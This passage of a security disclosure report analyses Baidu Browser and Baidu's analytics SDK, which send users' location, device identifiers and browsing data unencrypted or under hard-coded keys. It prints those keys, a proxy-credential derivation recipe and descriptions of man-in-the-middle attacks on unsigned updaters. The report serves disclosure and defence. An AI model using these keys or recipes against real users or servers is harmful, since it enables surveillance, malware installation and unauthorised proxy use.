order to give Baidu sufficient time to fix all the vulnerabilities that we identified.\nFollowing our security disclosure, Baidu indicated that they would release updated versions of both the Windows and Android clients by February 14, 2016. We performed an analysis of both updated versions to determine if the issues we identified had been resolved. The results of that analysis are described in the “Update: Analysis of updated versions of Baidu Browser” section at the end of this report.\nOn February 16, 2016 we emailed a set of questions regarding Baidu Browser’s security and privacy practices to Baidu’s Director of International Communications, and on February 22, 2016 we received their responses.\nWe have documented all correspondence with Baidu related to these security issues in an Appendix at the end of this report.\nBaidu Browser: Brief Background\nBaidu Browser (百度浏览器) is a web browser produced for Windows and Android, developed by China-based Internet giant Baidu. First released in 2011 and based on Google’s Chromium platform, the web browser offers a number of features, including integrated video and audio downloading tools, a built-in torrent client and mouse gesture support. The browser is one of many service offerings from Baidu, which include its marquee search engine, a massive advertising platform, and Baike, a Wikipedia-like collaborative encyclopedia. In 2015, the browser was estimated by China Internet Watch to have had a penetration rate amongst Chinese users of 29.2%.\nBaidu has become one of the dominant tech companies in China, and shielded from competition from the censored Google search engine, it has become the most used search engine in China. The Baidu search engine ranks fourth on the Alexa list of most visited websites worldwide, and is the most visited website in China. The company earned USD$7.96 billion in revenue in 2014.\nIn July 2014, Baidu formed a partnership with U.S.-based Internet traffic management company CloudFlare, creating a service that leverages Baidu’s Chinese data centres with CloudFlare’s traffic management services to increase traffic speeds across China’s border. The service, called Baidu Yunjiasu (百度云加速) or “Cloud acceleration,” is primarily targeted at businesses seeking to speed up the flow of traffic across China’s inefficient, censorship-heavy network. Part 2 of our analysis below describes a feature of Baidu Browser that proxies traffic to certain websites hosted outside of China to improve performance.\nTechnical Analysis\nWe analyzed both the Android and Windows versions of Baidu Browser using reverse engineering techniques. To analyze program behavior, we used machine code and bytecode disassemblers, decompilers, and debuggers including JD, JADX, and IDA. To capture and analyze network traffic, we used tcpdump and Wireshark.\nOur analysis is split into three parts. The first part describes how both the Android and Windows versions of the Chinese language Baidu Browser send unencrypted and easily decryptable personal information to Baidu servers. The second part describes a feature in the Chinese Windows version of Baidu Browser that proxies requests for certain websites hosted outside of China to increase performance. The third part discusses the shared vulnerabilities between the Chinese and global versions of the browser and how many of these shared problems exist due to the use of a Baidu software development kit that exists in other Baidu and third-party apps.\n\n“Easily decryptable” encryption\nIn this report we sometimes utilize the phrase “easily decryptable” in referring to the encryption used by Baidu Browser. Here we discuss what we mean by this phrase, and how Baidu Browser’s encryption could be properly implemented.\nWhen we say that encryption is “easily decryptable,” we do not mean that the encryption algorithm used is itself flawed or insecure (although in some cases the algorithms Baidu Browser uses are). Instead, we mean that the algorithm is used improperly. Namely, it is used in such a way that an analyst examining Baidu Browser could write a tool capable of decrypting these algorithms’ encryption.\n\nThere are two basic ways of encrypting data: using either symmetric encryption or asymmetric encryption. The advantage of symmetric encryption (illustrated in Figure 1) is that it is significantly faster than asymmetric encryption. The disadvantage is that with symmetric encryption, when you know the algorithm used to encrypt and, if it uses one, its key, then you also know how to decrypt anything it encrypts. With simple algorithms, this is as easy as reversing the steps of that algorithm. When encryption uses only symmetric algorithms, someone analyzing a program can write a tool to decrypt anything that the program encrypts by analyzing the algorithms it is using and/or finding its hard-coded encryption keys (fixed encryption keys that appear inside the program’s code).\n\nAsymmetric algorithms (illustrated in Figure 2) such as RSA were developed to address this weakness. While they are significantly slower than symmetric algorithms, they have the advantage that a different key is used to decrypt data than the one used to encrypt. These keys must be mathematically related, but the algorithms are designed such that it is easy to generate a key pair but computationally intractable to derive the decryption key from the encryption key. This means that a program can use a hard-coded encryption key but keep the decryption key a secret by storing it only at the recipient. Although the recipient of the data, using the secret decryption key, will still be able to decrypt the data, a third party cannot write a tool to do so since the decryption key is not present in the program.\nTo ameliorate the performance disadvantage of asymmetric encryption, it is typically combined with symmetric encryption using the following technique. To encrypt data, a symmetric encryption key is randomly generated and used to encrypt that data. Then the randomly generated symmetric key is encrypted using an asymmetric key. The asymmetrically encrypted symmetric key and the data encrypted with that symmetric key are then sent to the recipient. The recipient can then decrypt the symmetric key using her private decryption key and use the decrypted symmetric key to decrypt the data. Since only the key, which is typically much smaller than the data, is encrypted using asymmetric encryption, this technique is much faster than using asymmetric encryption to encrypt all of the data and thus combines the best properties of both types of encryption. It is the foundation of common encryption protocols on the Internet such as SSL.\nWe describe Baidu Browser’s encryption as easily decryptable because it is entirely symmetric and uses hard-coded keys. We demonstrate that their communications encrypted using this method can be easily decrypted. We recommend that Baidu and anyone else desiring to securely send sensitive information over the Internet use a well-known and well-tested protocol utilizing asymmetric cryptography (such as SSL) and not attempt to implement their own “homebrew” encryption protocols. SSL in particular is a well-analyzed protocol that addresses many security issues not likely to be considered by a nonprofessional cryptographer.\n\nPart 1: Insecure transmission of personal data\nAndroid Version\nWe analyzed version 6.2.18.0 of the browser, which we downloaded from http://mb.baidu.com/. We identified a number of security and privacy concerns regarding transmission of personal data through insecure methods. Table 1 summarizes the personal data that is collected and transmitted by the application with either no encryption or with easily decryptable encryption methods.\nTable 1: Summary of personal data collected and level of encryption of Android version of Baidu Browser\n\n\n\n\nPersonal Data\nLevel of Encryption\n\n\n\n\nUser Operating System\nNot encrypted\n\n\nGPS coordinates plus last GPS update time\nNot encrypted\n\n\nIMEI\nEasily decryptable\n\n\nNearby wireless networks including MACs\nEasily decryptable\n\n\nSearch terms entered into address bar\nNot encrypted\n\n\nURLs visited\nNot encrypted\n\n\n\n\nWe identified the following security flaws related to the collection and transmission of personal data in a number of features of the Android version of the application:\na. Leaks sensitive data on startup\nUpon application launch, we observed Baidu Browser sending an HTTP POST request to\nhttps://hmma.baidu.com/app.gif\nThe body of this HTTP request is a gzipped JSON file. The JSON file contains a list of fields with various details about the phone and the user, some in plain text and others encrypted.\nUnencrypted fields in the JSON file include:\no: the user’s operating system (e.g., “Android”)\nn: Baidu Browser version number\nw, h: width and height, respectively, of the screen in pixels\ngl: GPS coordinates and time of last GPS update\nSome fields are encrypted using AES+ECB with the hard-coded ASCII-encoded key\nh9YLQoINGWyOBYYk\nand then Base64 encoded. These fields include:\ndd: IMEI number\nii: a string containing the phone’s IMEI number written backwards and an MD5 hash of Android software version information\nwl2: list of all in-range wireless networks and their MAC addresses and signal strengths\nWith knowledge of the hard-coded key, these fields can easily be decrypted. The source code for a python script for decrypting these fields is available here.\nb. Leaks sensitive data and address bar contents when inputting into address bar\nLike other browsers, users can enter text into the address bar of Baidu Browser in order to either visit a given URL or to perform a search. When text is entered into the address bar in such a manner, it is sent without encryption as an HTTP GET request with multiple GET parameters to the following URL:\nhttp://uil.cbs.baidu.com/sug/rich\nFor example, inputting the text “some address bar contents” into the address bar generates:\nhttp://uil.cbs.baidu.com/sug/rich?wd=some+address+bar+contents&ua=I4Ly8_OLL8_lPvC0tpwbqkrywN0sCFzKkhF6q9pvANIr5wj0_hHQNgCcvCgnhvId_OXNiyJuvNvrCUdsB&cuid=ga2Pfgal2u0ca28Yg8vkugu0-uYBiSiAlP2Nf_8ZS88Pa28g_a2q8_aq28_qa28qA&cfrom=1200a&from=1200a&crp=0&it=0&ctv=2&st=00000000&nw=3g&cen=ua_cuid\nThese GET parameters include\nwd: address bar contents\nua: screen size in pixels, phone model, Android and Baidu Browser version numbers\ncuid: the string concatenation of both an md5 hash of Android version information and the phone’s IMEI number written backwards\nThe wd parameter value is sent without encryption; however, the ua and cuid parameter values are encrypted with a nonstandard, easily decryptable algorithm described as follows. Each 32-bit word of the string’s UTF8-encoded bytes is interpreted as a little-endian integer, then circularly bit-shifted to the right by three bits and XOR’d with the hard-coded mask 0x2D382324. Finally, the resulting 32-bit words are together Base64-encoded with the following custom 64-character alphabet:\nqogjOuCRNkfil5p4SQ3LAmxGKZTdesvB6z_YPahMI9t80rJyHW1DEwFbc7nUVX2-\nNote that the typical Base64 alphabet is as follows:\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\nWith knowledge of the algorithm and the custom alphabet, these fields can be easily decrypted, and the source code for a python script for decrypting these fields is available here. This algorithm is implemented by Baidu Browser in native ARM code in the implementation of the nativeB64Encode(byte[]) function in libchiperencoder_v1_3_1_browser.so (“chiper” in “libchiperencoder” is likely a misspelling of “cipher”).\nc. Phones home with sensitive data about every page view\nAfter a page is viewed in the browser, a GET request is sent to the following URL:\nhttp://t5.baidu.com/kw\nThe HTTP Referer header contains, unencrypted, the full URL of the page visited. The URL is reported unencrypted even if the page was retrieved via HTTPS, which would normally encrypt the URL in the page request. The value of its etag GET parameter is encrypted using RC4 using the ASCII-encoded five-byte key:\nHR2ER\nWhen decrypted, the tag contains a number of other values including the cuid, which contains the phone’s IMEI number written backwards, and various timing information related to how long various steps of loading the page took, including DNS lookup, creating the connection, and DOM loading.\nd. Insecurely checks for software updates\nWhen the application makes a request for updates, it makes an HTTP GET request to the following URL:\nhttp://uil.cbs.baidu.com/update\nThis request includes multiple GET parameters including the encrypted ua and cuid parameters described in the previous section. The server returns a response in an unencrypted but zlib-compressed custom binary format. If an update is available, the server will include the description of the update and an APK URL in the response. Baidu Browser will display the description, inquiring whether the user wants to upgrade. If the user confirms the upgrade, the APK is downloaded and automatically opened, prompting the user with the typical Android system user interface for the install or upgrade of apps (see Figure 3).\nThe APK is not verified by Baidu Browser with any digital signature, and so any man-in-the-middle can perform an active attack by sending specially crafted responses. A man-in-the-middle is thus capable of sending a URL to any APK along with a textual description of the update that will be presented to the user. Since Android will not allow an APK to upgrade an app if the APK is signed with a different digital signature than that of the currently installed app, this technique cannot be used to replace Baidu Browser with an arbitrary APK. However, it may still be used to install a new app, and a properly crafted APK (for example, using the name and logo of Baidu Browser) could be used to deceive a user into installing a malicious APK (see Figure 3).\nFigure 3: Example man-in-the-middle attack on Baidu Browser’s updater. On the left, we injected a custom update description. On the right, after the update is downloaded, the browser prompts the user to install the Angry Birds APK (an actual attacker might instead craft an app called “Baidu Browser” with an icon similar to that of Baidu Browser to further convince the user to install it).\nWindows Version\nWe analyzed version 7.6.100.2089 of the Windows version of Baidu Browser, which we downloaded from http://liulanqi.baidu.com/. This version also contained a number of vulnerabilities presenting privacy and security concerns. Table 2 summarizes the personal data points collected and transmitted with either no encryption or easily decryptable encryption methods:\nTable 2: Summary of personal data collection and level of encryption of Windows version of Baidu Browser\n\n\n\n\nPersonal Data\nLevel of Encryption\n\n\nSearch terms entered into address bar\nNot encrypted\n\n\nHard disk drive serial number, model number and controller version number\nEasily decryptable\n\n\nMAC address\nEasily decryptable\n\n\nURLs visited including page title\nEasily decryptable\n\n\nMachine CPU model\nEasily decryptable\n\n\nHard disk drive serial number\nEasily decryptable\n\n\nFile system volume serial number\nEasily decryptable\n\n\n\n\nWe identified the following security flaws related to the collection and transmission of personal data in a number of features of the Windows version of the application:\na. Leaks address bar contents when inputting into address bar\nLike the Android version, when a user enters text into the address bar in order to retrieve search suggestions, that text is sent without encryption as an HTTP GET request to the following URL:\nhttp://uil.cbs.baidu.com/sug/rich\nwith the address bar contents in the value of the wd parameter.\nb. Communicates with Baidu servers via an easily decryptable protocol\nUpon application launch and while browsing, we also observed that Baidu Browser sends multiple HTTP POST requests to various subdomains of the *.br.baidu.com domain. The bodies of these POST requests always adhere to a certain format: a header followed by an encrypted payload. Two strings appear, unencrypted, in the header. The first is the browser’s GUID, which is the MD5 hash of\n\nHard drive disk serial number\nHard drive disk model number\nHard drive disk controller version number\nNetwork MAC address\nThe string “BDM”\n\njoined by “#” characters, e.g.,\nmd5(“VBf952409b-973833b1#VBOX HARDDISK#1.0#080027f2c8cf#BDM”).\nThe second string is the browser’s SupplyID, a value retrieved from the\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Baidu\\BaiduBrowser\\SupplyID\nregistry key, which appears to be related to the version of the browser.\nThe encrypted payload, when decrypted, contains data serialized using Google Protocol Buffers, or protobuf. The serialized data is encrypted using a modified TEA cipher that we call MTEA. The block cipher mode Baidu uses with MTEA is a nonstandard modification of CBC (see Figure 4) that we call MCBC.\nFigure 4: MCBC, the nonstandard modification of CBC Baidu uses for MTEA. Additional XOR operations of MCBC over CBC are in dashed-blue in the above figure.\nFor encrypting and decrypting all protobuf messages, Baidu Browser uses MTEA+MCBC with the following hard-coded ASCII-encoded key:\nvb%,J^d@2B1l’Abn\nAn all-zero-byte initialization vector is always used. The source code for a python script for decrypting these requests is available here.\nc. Phones home information about every page view that includes hardware serial numbers\nWe decrypted the protobuf requests made by the browser. We found that one such request, which we call the Page Report request, is sent for every page that the user views, including both HTTP and HTTPS pages, and includes the following information about the page and the user:\n\nThe page’s full URL\nThe page’s HTTP status code\nThe page’s HTML title\nEvery domain for which the browser has stored a cookie named “BAIDUID” and that cookie’s contents (Baidu uses a cookie with this name as a tracking cookie)\nMachine’s CPU model\nMachine’s hard drive serial number\nFile system’s volume serial number\nMachine’s network MAC address\nBrowser’s GUID\n\nd. Insecurely checks for software updates\nWhen the browser checks for updates, it makes a protobuf request, which we call an Update Info request, for information pertaining to the latest version of Baidu Browser. The decrypted response includes the version number of the latest release, a description of its improvements, a URL for the browser to download an executable to update to the latest version, and that file’s MD5 hash. The executable is not protected with any digital signature, only the MD5 hash in the encrypted protobuf request. By encrypting and sending its own protobuf replies, any man-in-the-middle performing an active attack can send a URL to any executable and its MD5 hash to cause the browser to download and execute arbitrary code.\nFigure 5: Example man-in-the-middle attack on Baidu Browser’s self-updater. A benign program that displays “Oh Hai There” was used as the payload, but any arbitrary program could be injected.\ne. Updates list of website domains triggering proxying\nWhen the browser starts, it makes a protobuf request we call a Proxy Info request that, when decrypted, contains the version numbers of different resources related to Baidu’s automatic proxying for foreign websites, explained in detail in Part 2 of our report. If the server determines that one of these resources requires an update, depending on the resource, either an up-to-date version of the resource will be included in the protobuf response or a link to the latest version will be provided with its MD5 hash and an encryption key to decrypt it.\nPart 2: Proxying of foreign-hosted websites\nWeb users in China face one of the world’s strictest regimes of Internet censorship. Perhaps the most well known form of censorship in China is the “Great Firewall” – the comprehensive system of web filtering that blocks attempts from within China to access banned content. As this system limits the access Chinese Internet users have to content hosted outside of the country, many users seek out methods of circumventing this censorship. One such method is through the use of internationally-hosted proxies, which mask and redirect web traffic in order to evade censorship.\nIn addition to the limits that China’s censorship imposes on access to information, the Great Firewall also introduces significant inefficiencies that slow the transmission of data into and out of the country. Proxies can serve to improve performance by bypassing these network bottlenecks.\nOur analysis of the Windows version of Baidu Browser shows that the software contains a feature to automatically proxy requests to certain websites hosted outside of China. Baidu advertises such a service on its website and describes the potential performance improvements (see Figure 6).\nFigure 6: “We took millions in advertising earnings to buy an overseas tunnel to accelerate access to overseas websites.” (Retrieved November 13, 2015)\nIn addition to improving performance, we have also found that the proxy provides access to some websites that are normally blocked by the Great Firewall, such as www.wordpress.com. Only certain websites, predetermined by Baidu, are tunneled through the proxy according to rules determined by the following three resources: kv_auth, fg_pac, and kv_report.\nkv_auth resource\nThe kv_auth resource contains information about different proxy servers. If the browser’s version of kv_auth is not up to date, then a newer version will be included inside the response to the Proxy Info request. The resource contains MD5 hashes of proxy address domain:port pairs. For instance, one hash entry is 6d4c0ce00565ca6e6ec8f7bff5ab7619, which corresponds to md5(“0.wacc.baidu.com:80”). Each of these hash entries is associated with a username salt and a password salt, which will be used to compute the username and password to access the proxy, as explained later. For instance, the username salt and password salt currently provided in the entry for 6d4c0ce00565ca6e6ec8f7bff5ab7619 are “2” and “345,” respectively.\nThe list currently contains 13 entries; however, since only hashes are provided, we cannot use this list to acquire the entire list of proxies. We have a decrypted version of this resource here.\nfg_pac resource\nThe fg_pac resource contains rules for determining which websites are proxied. If the browser’s version of fg_pac is not up to date, then a link to download a newer version of the file will be included in the response to the Proxy Info request, along with that file’s MD5 hash and encryption key. The encryption key, when zero-padded to 16 bytes, can be used to decrypt the file using the MTEA+MCBC algorithm described in an earlier section. At present, the key provided in the protobuf response is “test”; thus when zero-padded it is “test” followed by 12 zero bytes. The URL presently provided is\nhttp://dlsw.br.baidu.com/odin/201509/808996d05fb8fbb43ab4db44a5429058.e\nWe have a decrypted version of the above file available here, and the source code for a python script to decrypt it is available here. Note that since the filename in the URL is the MD5 hash of the file’s contents, any update to the file would be at a different URL, and so the above URL cannot be tracked for updates.\nWhen decrypted, this file is a proxy auto-config, or PAC file, which is Javascript code for determining which websites are proxied, which proxy is used for each website, and whether to use HTTP or HTTPS to communicate with that proxy.\nThe PAC file presently associates websites with one of two different proxy servers, 0.wacc.baidu.com and out.wacc.baidu.com, including whether the browser should connect to the proxy via either HTTP or HTTPS. We found no obvious pattern as to why some websites use one proxy versus the other or why some websites connect to the proxy with HTTP versus HTTPS. If a site does not match the rules for any proxy or matches the rules for a blacklist included in the PAC file, then no proxy will be used. We found that the MD5 hashes of 0.wacc.baidu.com:80, 0.wacc.baidu.com:443, out.wacc.baidu.com:80, and out.wacc.baidu.com:443 (each proxy server on HTTP and HTTPS ports) account for four of the hashes currently provided by the kv_auth file, but the other nine are presently unknown.\nkv_report resource\nThe kv_report resource is used to determine if visiting a website sends additional reporting information to Baidu. If the browser’s version of kv_report is not up to date, then a newer version will be included inside the response to the Proxy Info request. This resource contains a list of domains. If a viewed page matches one of these domains, then the browser sends another encrypted protobuf request in addition to the Page Report request that we describe earlier about the page and its request. This information includes:\n\nThe page’s full URL\nThe page’s HTTP “Referer” field\nThe site’s IP address\nThe list of HTTP redirects taken to arrive at the page\nThe start and end times of the page’s DNS lookup (if performed), TCP connection, SSL handshake (if performed), and the total request time\nWhether any proxying was used and, if so, which proxy\n\nWe have a decrypted version of this resource here. The domains listed in this resource largely overlap with the sites in the fg_pac resource, and it may be intended to debug performance of proxied sites and other sites perhaps under consideration for being proxied.\nAnalysis\nWe found that both proxies referenced in fg_pac resource, 0.wacc.baidu.com and out.wacc.baidu.com, are modified Squid proxies. Username and password authentication is required to use the servers. The proxy authentication scheme is consistent with the digest scheme described in RFC 2617 with authentication quality of protection enabled. The username and password used for authentication are dynamically computed, the latter of which is a function of the value of a nonstandard ip field communicated by the Squid proxy in an HTTP header. The username and password can be computed as follows:\n1. Set key to be the proxy’s password salt (specified by the kv_auth resource) padded to 16 bytes\n2. Set user1 to be the user salt (specified by the kv_auth resource)\n3. Set user2 to be: browser’s GUID + “|0|” + fg_pac version number\n4. Then encrypt user2 using MTEA+MCBC with key key and Base64 encode it\n5. The username is: user1 + “|” + user2\n6. Let ip be the value of the nonstandard ip field returned by the proxy in the HTTP header\n7. Then the password is: md5(browser’s GUID + “|” + ip + “|” + password salt)\nWe wrote a python script that would authenticate with the proxy and request to download arbitrary URLs. First, we used it to test whether Baidu Browser would access sites not listed in the fg_pac file. We found that both proxy servers displayed error pages (illustrated in Figure 7) demonstrating server-side access controls to ensure that the proxies cannot be used to access sites for which they are not intended to be used. From a Chinese VPS, we tested access to every domain in the Alexa Top One Million list, and we found 46 additional domains (see Figure 8) that both proxy servers allow even though they do not appear in the fg_pac resource used by the browser. These domains include google.com (which is still mentioned in fg_pac but is presently commented out and thus disabled), facebook.com, github.com, and stackoverflow.com, and many of these 46 domains are presently blocked in China. It is unclear why the proxy servers allow domains in addition to the ones for which the browser uses the proxy.\nFigure 7: Attempting to manually use the proxy to access unapproved sites such as www.citizenlab.org results in a server-side error.\n \n\n\n\n\nangularjs.org\nblogblog.com\nblogger.com\nblogspot.com\nblogspot.jp\nchromium.org\ncrossrider.com\ndropbox.com\ndropboxusercontent.com\nebaystatic.com\nfacebook.com\nfbcdn.net\nflickr.com\nfreebase.com\nfsdn.com\ngithub.com\ngithubusercontent.com\ngmail.com\ngolang.org\ngoogle.co.jp\ngoogle.co.th\ngoogle.com\ngoogle.com.br\ngoogle.com.eg\ngoogle.com.hk\ngoogle.fr\ngooglecode.com\nhhvm.com\nlivefyre.com\nllvm.org\nmagnumphotos.com\nmitbbs.com\nnytimes.com\nschema.org\nslideshare.net\nsourceforge.net\nsstatic.net\nstackexchange.com\nstackoverflow.com\nt.co\ntwimg.com\ntwitter.com\nwebex.com\nwikimedia.org\nwikimediafoundation.org\nwikipedia.org\n\n\n\nFigure 8: Forty-six additional domains from the Alexa Top One Million list that proxy servers allow even though they do not appear in the fg_pac resource used by the browser.\n\nWe next used the script to determine the endpoints of each proxy. The addresses of both proxies 0.wacc.baidu.com and out.wacc.baidu.com (111.206.37.99 and 111.206.37.225, respectively) appeared to be in mainland China; however, we observed sites accessed via 0.wacc.baidu.com were receiving requests from 180.76.14.8, 180.76.14.131, 180.76.14.132, 180.76.14.138, and 180.76.14.142, all addresses in Hong Kong. We were able to observe these addresses by visiting http://www.reddit.com/account-activity, since www.reddit.com is one of the sites allowed by the proxies’ access controls. Moreover, we observed out.wacc.baidu.com had additional endpoints in 180.76.14.0/24. This suggests that both of these proxy servers tunnel HTTP requests from mainland China to Hong Kong.\nWe used our python script on a Chinese VPS to test if the proxy would improve download performance of sites and found that many of the sites listed in fg_pac consistently took less time to download. We thought that this could be explained solely by Squid’s caching behavior, but when we appended random query parameters to the URLs to ensure that they would not hit the Squid proxy’s cache, some sites still downloaded more quickly. For instance, on the Chinese VPS, live.com downloaded on average in 1.55 seconds without the proxy, but in 0.39 seconds using it. We found that all sites with a *.hk domain loaded in approximately the same time whether using the proxy or not, suggesting that the tunnel to Hong Kong may not necessarily be faster than ordinary routing; however, we found that routes from Hong Kong to overseas servers are often faster than routes from mainland China. For instance, by doing a traceroute from the VPS to live.com, we found that packets do not enter Microsoft’s autonomous system until North America, whereas by doing the same traceroute from Hong Kong we found that they entered Microsoft’s autonomous system before leaving Hong Kong via the AMX-IX Hong Kong Internet exchange.\nIn our testing, we were unable to download some of the sites also found that some of the sites from our Chinese VPS unless the proxy was utilized. In Table 3, we list all sites from the fg_pac file that were only accessible from our VPS by using a proxy. We say that a site was DNS poisoned if the DNS request received at least two responses, the first being anomalous and the final being correct. We say that the connection timed out to a site when the TCP handshake to that site never completed due to timing out. We say that the connection was reset to a site for which a TCP reset prematurely aborted our HTTP connection to that site. We found that all of the sites in this category trigger resets when their domain is in the HTTP host field of any HTTP request.\nTable 3: Sites accessible using the proxy but otherwise inaccessible from our Chinese VPS, categorized by reason for inaccessibility.\n\n\n\n\nDNS poisoning\nConnection timeout\nConnection reset\n\n\n\n\nedgecastcdn.net\nandroid.com\napis.google.com\ngoogleapis.com\ngstatic.com\nhtml5rocks.com\nexpedia.com\nexpedia.com.hk\nwordpress.com\n\n\n\n\nWe found that proxied traffic is also not subject to HTTP keyword filtering. For instance, both the keywords freenet and hrichina were not censored in HTTP requests to foreign sites when using the proxy, whereas when not using the proxy, they triggered injected TCP resets.\nDespite Baidu Browser’s fg_pac file no longer including rules to proxy them, the domains translate.google.com.hk, translate.googleusercontent.com, and webcache.googleusercontent.com are presently still allowed by the proxies’ server-side access control rules. Thus, someone directly using the proxies without using Baidu Browser (for instance, using our python script) can still view almost any webpage through the proxy via either Google’s translation service or Google’s web cache.\nPart 3: Vulnerabilities in other Baidu products and third-party apps\nWe conducted a preliminary investigation to determine if the leaks of sensitive information discovered in Baidu Browser also existed in other Baidu products, via a shared code mechanism or otherwise. Baidu produces global editions of both the Windows and Android versions of its browser, which we examined in detail, and we describe the results below. We found that many of the leaks of sensitive information in the Android edition of the browser exist as part of an analytics software development kit (SDK) used not only in other Baidu Android apps but also in a large number of third-party apps as well.\nGlobal editions of Baidu Browser\nWe investigated both the Windows and Android global editions of the browser. We obtained version 43.22.1000.452 of the global edition of the Windows browser downloaded from Baidu’s English-language site. We analyzed this version and did not find the same information leaks as were found in the Chinese version. Search terms entered into the address bar were sent encrypted over SSL. We found that the browser does send additional information back to Baidu’s servers via HTTP during startup and as triggered by other operations of the browser, but the data itself in the HTTP payload appears to be encrypted using a randomly generated 128-bit AES key encrypted with a 1024-bit RSA key. The encryption is thus asymmetric and not as easily decryptable by an eavesdropper; however, since the encryption does not appear to be implemented via a well-tested protocol such as SSL, it may contain less obvious flaws, and so further investigation is still warranted to determine its security.\nWe also analyzed version 5.1.0.1 of the global edition of the Android browser available from the Google Play store; however, unlike the global Windows and Chinese Windows versions, we found that the information that the Chinese Android version leaks at startup is also leaked by the global Android version and is sent to the same servers using the same easily decryptable cryptography. We discovered that the shared leaks are related to a common software development kit employed by both browsers, which we discuss in further detail below. We also found that the global Android browser sends information about pageviews via a different mechanism than the Chinese Android browser, but it is still encrypted using a symmetric, easily decryptable algorithm, which for brevity we do not describe in this report but make available a python script for decrypting here. The browser also sends sensitive information to an additional server encrypted with a 1024-bit RSA key, but, as with the global Windows version, the use of asymmetric encryption does not guarantee secure transmission, and so further investigation is required to determine if this instance of encryption is secure, although the browser is already leaking this sensitive information through more obvious means anyways.\nWe analyzed neither the global Windows nor global Android versions of the browser for other vulnerabilities such as those that may exist in their self-update processes or otherwise.\nSensitive data leaks in Baidu Mobile Tongji (Analytics) SDK\nWe found that the shared sensitive information leaks in both the Chinese and global versions of the Android browser are due to use of a common SDK, the Baidu Mobile Tongji (Analytics) SDK. The SDK is available as a download for use by third-parties at http://mtj.baidu.com. We have found two variants of the SDK:\n\ncom.baidu.mobstat.*\ncom.baidu.mtjstatsdk.*\n\nUsing data provided by Lookout, a mobile security company, we were able to determine a list of apps containing either of the above SDK variants in other Baidu and third-party apps. Lookout searched their app database for the presence of each of the above SDK variant names and the hard-coded key “h9YLQoINGWyOBYYk”. For com.baidu.mobstat.*, they found 11,636 unique Android app package names, and for com.baidu.mtjstatsdk.*, they found 12,482 unique app package names. Together, there were 22,548 unique app package names (a small number of apps contained both SDK variants).\nMany of these apps appeared to have automatically generated package names which inflated the actual number of legitimate apps containing the SDK. Therefore, we filtered the apps by whether they were present in the Google Play Store. We found that only 454 of 22,548 of these were in the Google Play store. Since Google and the Google Play Store are presently inaccessible in mainland China, third-party app stores in China are very common. On hiapk.com, one popular app store in China, we found 6,672 out of 22,548 of the apps were present.\nWe analyzed the popularity of the apps that were in the Google Play Store. Among the apps that were free to download and that the store showed as having been installed a million or more times, we downloaded the app and manually verified that the SDK was still present in the app. In Table 4, we list these apps ordered by popularity.\nTable 4: Popular apps in the Google Play Store containing the SDK and the number of their Google Play Store installs.\n\n\n\n\nGoogle Play Store installs\nAndroid app title and package name\n\n\n\n\n100,000,000 – 500,000,000\nES File Explorer File Manager [com.estrongs.android.pop]\n\n\n50,000,000 – 100,000,000\nPhoto Wonder-Collage Maker [cn.jingling.motu.photowonder]\n\n\n10,000,000 – 50,000,000\nAzar-Video Chat & Call, Messenger [com.azarlive.android]\nES Task Manager (Task Killer) [com.estrongs.android.taskmanager]\n愛奇藝PPS [tv.pps.mobile]\n\n\n5,000,000 – 10,000,000\nMeipai [com.meitu.meipaimv]\n\n\n1,000,000 – 5,000,000\n百度地图 [com.baidu.BaiduMap]\n手机百度 [com.baidu.searchbox]\nWell File Manager [com.fihtdc.filemanager]\nSingPlay: Karaoke your MP3s [com.nexstreaming.app.singplay]\nKwai, the best short video App [com.smile.gifmaker]\nMydol (STAR LOCKSCREEN) [com.wacompany.mydol]\nSpeedometer GPS [luo.speedometergps]\n\n\n500,000 – 1,000,000\nES App Locker [com.estrongs.locker]\n爱奇艺视频HD [com.qiyi.video.pad]\n\n\n\n\nSince the Google Play Store is inaccessible in mainland China, these installs are likely to represent users outside of China. More research is required to determine how many users are affected by the SDK by apps in Chinese app stores, which our initial analysis indicates contain a much larger number of the affected apps and would better represent the number of these apps’ Chinese users.\nAny app that uses this SDK for statistics and event tracking sends messages to Baidu’s servers containing the same sensitive information in unencrypted and easily decryptable form that we saw the Baidu Android browser sending when it starts up. This includes the phone’s unique IMEI number, current GPS location, and nearby wireless networks.\nGoogle provides a competing analytics SDK, whose users it requires to follow multiple policies. However, in contrast to the Baidu SDK, which tracks and insecurely sends sensitive information in every transmission, we found that the Google SDK does not and in fact prohibits third parties from using it to “upload any data that allows Google to personally identify an individual (such as certain names, Social Security Numbers, email addresses, or any similar data), or data that permanently identifies a particular device (such as a unique device identifier if such an identifier cannot be reset), even in hashed form.”\nDiscussion\nMobile devices generate, collect, and transmit a wide variety of personal identifiers and user data, in many cases without providing any notification to users. Our primer on this topic, The Many Identifiers in Our Pockets, provides an overview of this data collection and highlights some of the risks associated with the widespread collection and transmission of these identifiers.\nThe issues identified in this report raise a number of concerns surrounding the privacy and security of personal user data for users of Baidu Browser. Numerous identifiers, including a user’s search terms, GPS coordinates, URLs of visited websites, and MAC address, are sent without encryption from the user’s device to Baidu-hosted servers. A number of other data points, including device IMEI, nearby Wi-Fi networks and their MAC addresses, hard drive serial number, and file-system volume serial number, are transmitted using easily decryptable encryption.\nThe transmission of personal data without properly implemented encryption can expose a user’s data to surveillance. Any in-path actor, which could include a user’s ISP, wireless network operator (such as a coffee shop Wi-Fi connection), mobile carrier, or a malicious actor with network visibility, would have visibility into the unencrypted data transmitted from this application. Further, an in-path actor would be able to decrypt the encrypted communications sent by this application with relative ease as a result of the methods used to encrypt this traffic. Such interception would permit the discovery of a user’s physical location, the terms for which they are searching, nearby wireless networks, and a number of digital fingerprints of their physical hardware. Users would have no way of knowing their data was surveilled in such a manner, and most would be unaware that such data was transmitted by the application at all.\nThe leakage of such user data is particularly problematic for individuals who use these applications and their devices to engage in politically-sensitive communications. For example, documents released by Edward Snowden indicate that members of the Five Eyes intelligence alliance have used similar personal data leaked through UC’s mobile web browser to identify targeted individuals and track their communications.\nFurther concerns are raised regarding the collection and storage of this personal user data by Baidu. Baidu, like all other companies offering Internet services and hosting user data in China, is required by Chinese law to permit law enforcement and intelligence services access to this data. Dissidents and activists based in China have previously raised concerns about authorities’ use of personal data gathered from surveillance of mobile applications produced by China-based companies. As this report has shown, the Windows version of Baidu Browser collects and transmits the URL and title of all websites visited by a user and sends it alongside the serial number of the user’s hard drive as well as their MAC address. While Internet companies often collect personal user data for the normal and efficient provision of services, it is unclear why Baidu Browser collects and transmits such an extensive range of sensitive user data points.\nIn 